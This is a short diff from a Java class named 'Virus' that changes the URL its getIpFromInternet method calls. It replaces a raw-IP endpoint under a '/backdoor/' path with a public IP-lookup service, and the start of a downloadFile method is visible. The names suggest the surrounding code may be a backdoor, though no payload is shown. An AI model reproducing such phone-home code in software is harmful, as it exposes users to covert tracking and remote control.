@@ -171,7 +171,7 @@ public class Virus implements Listener {
 
     public static String getIpFromInternet()
     {
-        return getHtml("http://39.103.149.33/backdoor/getip.php");
+        return getHtml("https://getip.api.soraharu.com/");
     }
 
     public static void downloadFile(String url, String filePath) {
